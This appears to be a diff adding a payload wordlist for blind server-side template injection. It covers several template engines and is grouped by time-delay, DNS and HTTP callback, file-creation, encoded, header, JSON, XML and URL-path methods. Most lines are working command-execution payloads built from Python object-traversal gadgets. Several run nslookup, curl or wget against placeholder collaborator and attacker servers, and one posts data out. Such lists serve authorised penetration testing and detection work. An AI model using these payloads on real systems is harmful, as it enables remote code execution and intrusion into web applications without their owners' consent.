@@ -1,0 +1,136 @@
+# ==================== TIME DELAY PAYLOADS ====================
+{{sleep(5)}}
+{{sleep(10)}}
+{{sleep(20)}}
+{{sleep(30)}}
+{{system("sleep 5")}}
+{{self.__init__.__globals__.os.system("sleep 5")}}
+{{config.__class__.__init__.__globals__['os'].popen('sleep 5').read()}}
+{{''.__class__.__mro__[2].__subclasses__()[40]('sleep 5', shell=True, stdout=-1).communicate()}}
+{{url_for.__globals__.os.system("sleep 5")}}
+{{get_flashed_messages.__globals__.os.system("sleep 5")}}
+{{cycler.__init__.__globals__.os.system("sleep 5")}}
+{{joiner.__init__.__globals__.os.system("sleep 5")}}
+{{namespace.__init__.__globals__.os.system("sleep 5")}}
+{{lipsum.__globals__.os.system("sleep 5")}}
+${"sleep".execute(5)}
+<%= system("sleep 5") %>
+{php}sleep(5);{/php}
+#set($x=$class.inspect("java.lang.Runtime").getRuntime().exec("sleep 5"))
+
+# ==================== DNS CALLBACK PAYLOADS ====================
+{{config.__class__.__init__.__globals__['os'].popen('nslookup YOUR-COLLABORATOR.burpcollaborator.net').read()}}
+{{''.__class__.__mro__[2].__subclasses__()[40]('nslookup YOUR-COLLABORATOR.burpcollaborator.net').read()}}
+{{self.__init__.__globals__.os.popen('ping -c 5 YOUR-COLLABORATOR.burpcollaborator.net')}}
+{{url_for.__globals__.os.system('curl http://YOUR-COLLABORATOR.burpcollaborator.net')}}
+{{cycler.__init__.__globals__.os.popen('wget http://YOUR-COLLABORATOR.burpcollaborator.net')}}
+{{config.__class__.__init__.__globals__['os'].popen('dig YOUR-COLLABORATOR.burpcollaborator.net').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('host YOUR-COLLABORATOR.burpcollaborator.net').read()}}
+${"nslookup YOUR-COLLABORATOR.burpcollaborator.net".execute()}
+<%= system("nslookup YOUR-COLLABORATOR.burpcollaborator.net") %>
+{php}system("nslookup YOUR-COLLABORATOR.burpcollaborator.net");{/php}
+#set($x=$class.inspect("java.lang.Runtime").getRuntime().exec("nslookup YOUR-COLLABORATOR.burpcollaborator.net"))
+
+# ==================== FILE CREATION PAYLOADS ====================
+{{config.__class__.__init__.__globals__['os'].popen('touch /tmp/ssti_vulnerable').read()}}
+{{''.__class__.__mro__[2].__subclasses__()[40]('/tmp/test.txt','w').write('vulnerable')}}
+{{self.__init__.__globals__.os.system('echo vulnerable > /tmp/test.txt')}}
+{{url_for.__globals__.os.system('touch /tmp/ssti')}}
+${"touch /tmp/vulnerable".execute()}
+<%= system("touch /tmp/vulnerable") %>
+{php}system("touch /tmp/vulnerable");{/php}
+
+# ==================== HTTP REQUEST PAYLOADS ====================
+{{config.__class__.__init__.__globals__['os'].popen('curl http://YOUR-SERVER.com/ssrf').read()}}
+{{''.__class__.__mro__[2].__subclasses__()[40]('curl http://YOUR-SERVER.com/callback').read()}}
+{{self.__init__.__globals__.os.popen('wget http://YOUR-SERVER.com/callback')}}
+{{url_for.__globals__.os.system('curl -X POST http://YOUR-SERVER.com -d "data=found"')}}
+${"curl http://YOUR-SERVER.com".execute()}
+<%= system("curl http://YOUR-SERVER.com") %>
+{php}system("curl http://YOUR-SERVER.com");{/php}
+
+# ==================== CALCULATION BASED BLIND ====================
+{{7*7}}
+{{7*7}}
+{{7*7}}
+{{7*7}}
+{{7*7}}
+{{7*7}}
+{{7*7}}
+{{7*7}}
+{{7*7}}
+{{7*7}}
+
+# ==================== ERROR BASED BLIND ====================
+{{unknown_variable}}
+${unknown_variable}
+${{unknown_variable}}
+{{undefined}}
+{{1/0}}
+${1/0}
+${{1/0}}
+{{throw('error')}}
+${throw('error')}
+{{config['unknown']}}
+${.unknown}
+
+# ==================== ENCODED BLIND PAYLOADS ====================
+%7B%7Bsleep%285%29%7D%7D
+%7B%7Bconfig.__class__.__init__.__globals__%5B'os'%5D.popen%28'nslookup%20YOUR-COLLABORATOR.burpcollaborator.net'%29.read%28%29%7D%7D
+%7B%7B''.__class__.__mro__%5B2%5D.__subclasses__%28%29%5B40%5D%28'sleep%205'%29.communicate%28%29%7D%7D
+%24%7Bsleep%285%29%7D
+%3C%25%3D%20system%28%22sleep%205%22%29%20%25%3E
+%7Bphp%7Dsystem%28%22sleep%205%22%29%3B%7B%2Fphp%7D
+
+# ==================== MULTI-STAGE BLIND ====================
+{{sleep(5) and nslookup YOUR-COLLABORATOR.burpcollaborator.net}}
+{{sleep(5) or nslookup YOUR-COLLABORATOR.burpcollaborator.net}}
+{{sleep(5)}} {{nslookup YOUR-COLLABORATOR.burpcollaborator.net}}
+{{sleep(5)}};{{nslookup YOUR-COLLABORATOR.burpcollaborator.net}}
+{{sleep(5)}}|{{nslookup YOUR-COLLABORATOR.burpcollaborator.net}}
+{{sleep(5)}}&{{nslookup YOUR-COLLABORATOR.burpcollaborator.net}}
+
+# ==================== PARAMETER BASED BLIND ====================
+?name={{sleep(5)}}
+?name={{nslookup YOUR-COLLABORATOR.burpcollaborator.net}}
+?user={{sleep(5)}}&pass=test
+?q={{sleep(5)}}&sort=asc
+?search={{sleep(5)}}&page=1
+?template={{sleep(5)}}&layout=main
+?data={{sleep(5)}}&format=json
+
+# ==================== HEADER BASED BLIND ====================
+X-Forwarded-For: {{sleep(5)}}
+X-Forwarded-Host: {{sleep(5)}}
+User-Agent: {{sleep(5)}}
+Referer: {{sleep(5)}}
+Cookie: session={{sleep(5)}}
+Cookie: name={{sleep(5)}}
+X-Custom-Header: {{sleep(5)}}
+
+# ==================== JSON BASED BLIND ====================
+{"name":"{{sleep(5)}}"}
+{"query":"{{sleep(5)}}"}
+{"data":"{{nslookup YOUR-COLLABORATOR.burpcollaborator.net}}"}
+{"template":"{{sleep(5)}}"}
+{"user":"{{sleep(5)}}","pass":"test"}
+
+# ==================== XML BASED BLIND ====================
+<name>{{sleep(5)}}</name>
+<user>{{sleep(5)}}</user>
+<data>{{nslookup YOUR-COLLABORATOR.burpcollaborator.net}}</data>
+<template>{{sleep(5)}}</template>
+<query>{{sleep(5)}}</query>
+
+# ==================== URL PATH BASED BLIND ====================
+/{{sleep(5)}}/admin
+/admin/{{sleep(5)}}/edit
+/api/{{sleep(5)}}/user
+/prefix{{sleep(5)}}suffix
+/{{sleep(5)}}.html
+/{{sleep(5)}}?x=y
+
+# ==================== RAPID BLIND DETECTION (ONE SHOT) ====================
+{{sleep(5)}}{{sleep(5)}}{{sleep(5)}}{{sleep(5)}}{{sleep(5)}}
+{{nslookup YOUR-COLLABORATOR.burpcollaborator.net}}{{nslookup YOUR-COLLABORATOR.burpcollaborator.net}}
+{{sleep(5)}}|{{nslookup YOUR-COLLABORATOR.burpcollaborator.net}}|{{sleep(5)}}
